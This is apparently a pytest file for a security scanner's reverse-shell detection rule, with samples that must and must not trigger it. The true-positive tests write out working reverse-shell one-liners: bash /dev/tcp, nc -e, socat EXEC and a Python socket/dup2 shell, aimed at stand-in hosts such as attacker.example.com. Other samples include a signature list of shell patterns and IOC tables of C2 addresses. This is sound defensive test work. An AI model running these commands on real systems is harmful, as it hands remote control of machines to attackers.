"""Tests for PI-026 reverse_shell_execution rule.

Covers both:
- False-positive samples from defensive security tools (IOC catalogs, detector
  log strings, signature arrays) that used to trigger PI-009 on mere mention of
  "reverse shell" — these must NOT match PI-026.
- True-positive samples with actual reverse-shell implementations (bash
  /dev/tcp, nc -e, socat EXEC:, python socket+dup2) — these MUST match PI-026
  and MUST be classified as HIGH severity.
"""

from __future__ import annotations

import pytest

from scanner.models import Severity
from scanner.stage1.engine import RuleEngine


@pytest.fixture
def engine() -> RuleEngine:
    return RuleEngine()


def _pi026_matches(engine: RuleEngine, content: str):
    return [m for m in engine.scan(content).matched_rules if m.rule_id == "PI-026"]


def _pi009_matches(engine: RuleEngine, content: str):
    return [m for m in engine.scan(content).matched_rules if m.rule_id == "PI-009"]


# ---------------------------------------------------------------------------
# False positives that must NOT match
# ---------------------------------------------------------------------------


class TestReverseShellFalsePositives:
    """Samples from openclaw-security-monitor (defensive scanner) must NOT match."""

    def test_ioc_table_reverse_shell_endpoint(self, engine: RuleEngine):
        content = (
            "## IOC Database\n"
            "### C2 IP Addresses\n"
            "| IP | Campaign | Notes |\n"
            "|----|----------|-------|\n"
            "| `91.92.242.30` | ClawHavoc | Primary AMOS C2 |\n"
            "| `54.91.154.110` | ClawHavoc | Reverse shell endpoint (port 13338) |\n"
            "| `202.161.50.59` | ClawHavoc | Payload staging |\n"
        )
        assert _pi026_matches(engine, content) == []
        # PI-009 must also not match — reverse shell is no longer in PI-009.
        assert _pi009_matches(engine, content) == []

    def test_ioc_txt_reverse_shell_target(self, engine: RuleEngine):
        content = (
            "95.92.242.30|clawhavoc|2026-01-27|Secondary C2\n"
            "# Reverse shell endpoint\n"
            "54.91.154.110|clawhavoc-revshell|2026-01-28|Reverse shell target port 13338\n"
        )
        assert _pi026_matches(engine, content) == []

    def test_malicious_pattern_signature_backdoor(self, engine: RuleEngine):
        content = (
            "^polymarket-all-in-one$|reverse-shell|Contains reverse shell backdoor (noreplyboter)\n"
        )
        assert _pi026_matches(engine, content) == []

    def test_detector_log_scanning_for(self, engine: RuleEngine):
        content = 'log "CHECK 3: Scanning for reverse shell skills and checking Gatekeeper..."\n'
        assert _pi026_matches(engine, content) == []

    def test_detector_log_no_reverse_shell_found(self, engine: RuleEngine):
        content = 'log "No reverse shell skills found and Gatekeeper is enabled"\n'
        assert _pi026_matches(engine, content) == []

    def test_detector_log_reverse_shell_detected(self, engine: RuleEngine):
        content = "guidance << 'EOF'\nReverse shell skills detected!\nEOF\n"
        assert _pi026_matches(engine, content) == []

    def test_signature_array_nc_e_literal(self, engine: RuleEngine):
        """bash array literal of signature strings — quoted, so nc -e pattern must not match."""
        content = (
            "REVERSE_SHELL_PATTERNS=(\n"
            '  "nc -e"\n'
            '  "nc.*-c.*sh"\n'
            '  "bash -i"\n'
            ")\n"
        )
        assert _pi026_matches(engine, content) == []

    def test_documentary_reverse_shell_attack_technique(self, engine: RuleEngine):
        """Defensive descriptive prose must not match."""
        samples = [
            "Block reverse shell attacks by enforcing egress filtering.",
            "This module prevents reverse shell techniques on Linux endpoints.",
            "We detect reverse shell connections via eBPF.",
            "A reverse shell backdoor was found in polymarket-all-in-one.",
            "Reverse shell detection is enabled by default.",
            "Known reverse shell patterns are listed in ioc/malicious-skill-patterns.txt.",
        ]
        for content in samples:
            assert _pi026_matches(engine, content) == [], (
                f"FP: unexpectedly matched on: {content!r}"
            )


# ---------------------------------------------------------------------------
# True positives that MUST match
# ---------------------------------------------------------------------------


class TestReverseShellTruePositives:
    """Real reverse-shell implementations and explicit attacker instructions."""

    def test_bash_interactive_dev_tcp(self, engine: RuleEngine):
        content = "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n"
        matches = _pi026_matches(engine, content)
        assert len(matches) >= 1
        assert all(m.severity == Severity.HIGH for m in matches)

    def test_bash_dev_tcp_no_space(self, engine: RuleEngine):
        content = "bash -i>&/dev/tcp/attacker.example.com/9001 0>&1"
        # The exact host form uses IP in our pattern; this alternate form also
        # matches because the pattern keys off "bash -i >& /dev/tcp/" prefix.
        assert len(_pi026_matches(engine, content)) >= 1

    def test_netcat_dash_e_bash(self, engine: RuleEngine):
        content = "nc -lvp 4444 -e /bin/bash\n"
        assert len(_pi026_matches(engine, content)) >= 1

    def test_netcat_dash_e_sh_short(self, engine: RuleEngine):
        content = "nc -e /bin/sh 10.0.0.1 4444\n"
        assert len(_pi026_matches(engine, content)) >= 1

    def test_socat_exec_bash_pty(self, engine: RuleEngine):
        content = 'socat TCP:attacker.com:4444 EXEC:"/bin/bash",pty,stderr\n'
        assert len(_pi026_matches(engine, content)) >= 1

    def test_python_socket_dup2_subprocess(self, engine: RuleEngine):
        content = (
            "import socket, subprocess, os\n"
            's = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n'
            's.connect(("1.2.3.4", 4444))\n'
            "os.dup2(s.fileno(), 0)\n"
            "os.dup2(s.fileno(), 1)\n"
            "os.dup2(s.fileno(), 2)\n"
            'subprocess.call(["/bin/sh", "-i"])\n'
        )
        assert len(_pi026_matches(engine, content)) >= 1

    def test_narrative_open_reverse_shell(self, engine: RuleEngine):
        content = "The skill will open a reverse shell to our server on port 4444.\n"
        assert len(_pi026_matches(engine, content)) >= 1

    def test_narrative_spawn_reverse_shell(self, engine: RuleEngine):
        content = "Next, spawn a reverse shell back to the C2.\n"
        assert len(_pi026_matches(engine, content)) >= 1

    def test_narrative_establish_reverse_shell(self, engine: RuleEngine):
        content = "We will establish a reverse shell tunneled through HTTP.\n"
        assert len(_pi026_matches(engine, content)) >= 1


# ---------------------------------------------------------------------------
# Regression: PI-009 no longer carries the reverse-shell keyword
# ---------------------------------------------------------------------------


class TestPI009NoLongerMatchesReverseShell:
    def test_pi009_unchanged_for_ngrok(self, engine: RuleEngine):
        """PI-009 must still match its remaining patterns (ngrok invocation)."""
        content = "ngrok http 4444\n"
        matches = [m for m in engine.scan(content).matched_rules if m.rule_id == "PI-009"]
        assert len(matches) >= 1

    def test_pi009_does_not_match_reverse_shell_endpoint(self, engine: RuleEngine):
        content = "| 1.2.3.4 | Campaign | Reverse shell endpoint |\n"
        matches = [m for m in engine.scan(content).matched_rules if m.rule_id == "PI-009"]
        assert matches == []
